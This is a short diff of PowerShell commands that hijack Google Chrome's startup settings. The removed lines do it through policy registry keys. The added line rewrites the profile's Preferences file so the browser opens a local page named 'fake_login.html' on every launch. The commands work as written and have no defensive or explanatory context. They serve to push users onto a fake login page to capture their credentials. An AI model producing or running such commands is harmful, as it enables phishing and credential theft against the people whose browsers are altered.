@@ -1,4 +1,1 @@
-New-Item -Path "HKCU:\Software\Policies\Google\Chrome" -Force
-New-ItemProperty -Path "HKCU:\Software\Policies\Google\Chrome" -Name "RestoreOnStartup" -Value 4 -PropertyType DWord -Force
-New-Item -Path "HKCU:\Software\Policies\Google\Chrome\RestoreOnStartupURLs" -Force
-New-ItemProperty -Path "HKCU:\Software\Policies\Google\Chrome\RestoreOnStartupURLs" -Name "1" -Value "file:///C:/Users/Public/login.html" -PropertyType String -Force
+powershell -Command "$path = \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences\"; if (Test-Path $path) { $json = Get-Content $path | ConvertFrom-Json; $json.session.restore_on_startup = 4; $json.session.startup_urls = @('file:///C:/Users/Public/fake_login.html'); $json | ConvertTo-Json -Depth 100 | Set-Content $path -Encoding UTF8 } else { Write-Output 'Chrome profile not found' }"
